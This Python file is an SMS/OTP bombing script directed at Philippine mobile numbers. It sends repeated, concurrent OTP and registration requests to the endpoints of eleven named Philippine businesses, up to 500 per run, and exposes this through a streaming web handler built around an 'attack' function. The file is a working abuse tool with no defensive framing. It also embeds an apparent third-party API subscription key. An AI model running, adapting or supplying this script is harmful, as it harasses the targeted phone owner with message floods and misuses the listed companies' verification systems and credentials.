import json
import asyncio
import aiohttp
import random

SERVICES = ["EZLOAN","XPRESS","ABENSON","EXCELLENT_LENDING","FORTUNE_PAY","WEMOVE","LBC","PICKUP_COFFEE","HONEY_LOAN","KOMO_PH","S5_OTP"]
MAX_LIMIT = 500

def normalize(p):
    p = p.replace(" ","").replace("-","")
    if p.startswith("0"): p = "+63"+p[1:]
    if p.startswith("63"): p = "+"+p
    if len(p)==10 and p[0] in "89": p = "+63"+p
    return p if p.startswith("+639") and len(p)==13 else ""

async def send(svc, session, phone):
    try:
        if svc=="EZLOAN":
            await session.post("https://gateway.ezloancash.ph/security/auth/otp/request",json={"businessId":"EZLOAN","contactNumber":phone[1:]},timeout=8)
        elif svc=="XPRESS":
            await session.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",json={"Phone":phone,"Email":f"user{random.randint(100000,999999)}@gmail.com","Password":"Pass1234","FingerprintVisitorId":"TPt0yCuOFim3N3rzvrL1","FingerprintRequestId":"1757149666261.Rr1VvG"},timeout=8)
        elif svc=="ABENSON":
            await session.post("https://api.mobile.abenson.com/api/public/membership/activate_otp",data={"contact_no":phone[1:]},timeout=8)
        elif svc=="EXCELLENT_LENDING":
            await session.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock",json={"domain":phone[1:],"cat":"login"},timeout=8)
        elif svc=="FORTUNE_PAY":
            await session.post("https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",json={"phoneNumber":phone[4:],"dialCode":"+63"},timeout=8)
        elif svc=="WEMOVE":
            await session.post("https://api.wemove.com.ph/auth/users",json={"phone_country":"+63","phone_no":phone[4:]},timeout=8)
        elif svc=="LBC":
            await session.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",data={"client_contact_no":phone[4:],"client_contact_code":"+63"},timeout=8)
        elif svc=="PICKUP_COFFEE":
            await session.post("https://production.api.pickup-coffee.net/v2/customers/login",json={"mobile_number":phone},timeout=8)
        elif svc=="HONEY_LOAN":
            await session.post("https://api.honeyloan.ph/api/client/registration/step-one",json={"phone":phone[1:]},timeout=8)
        elif svc=="KOMO_PH":
            await session.post("https://api.komo.ph/api/otp/v5/generate",json={"mobile":phone[1:]},headers={"Ocp-Apim-Subscription-Key":"cfde6d29634f44d3b81053ffc6298cba"},timeout=8,8)
        elif svc=="S5_OTP":
            await session.post("https://api.s5.com/player/api/v1/otp/request",data=f"phone_number={phone}",timeout=8)
        return True
    except:
        return False

async def attack(target, rounds, services):
    phone = normalize(target)
    if not phone:
        yield {"error":"Invalid PH number"}
        return

    total = min(rounds * len(services), MAX_LIMIT)
    rounds = total // len(services) + (1 if total % len(services) else 0)
    completed = success = failed = 0

    async with aiohttp.ClientSession() as s:
        for r in range(rounds):
            results = await asyncio.gather(*[send(svc, s, phone) for svc in services], return_exceptions=True)
            for svc, res in zip(services, results):
                completed += 1
                if res is True:
                    success += 1
                    yield {"type":"log","service":svc,"status":"success","progress":int(completed/total*100),"s":success,"f":failed,"t":completed}
                else:
                    failed += 1
                    yield {"type":"log","service":svc,"status":"failed","progress":int(completed/total*100),"s":success,"f":failed,"t":completed}
            if r < rounds-1:
                await asyncio.sleep(1.4)
    yield {"type":"done","s":success,"f":failed,"t":completed}

def handler(req):
    from aiohttp import web
    data = json.loads(req.get("body") or "{}")
    target = data.get("target","").strip()
    rounds = int(data.get("rounds",40))
    services = data.get("services", SERVICES)

    async def stream():
        resp = web.Response(headers={"Content-Type":"text/event-stream","Cache-Control":"no-cache"})
        await resp.prepare(req)
        async for msg in attack(target, rounds, services):
            await resp.write(f"data: {json.dumps(msg)}\n\n".encode())
        return resp
    return stream()
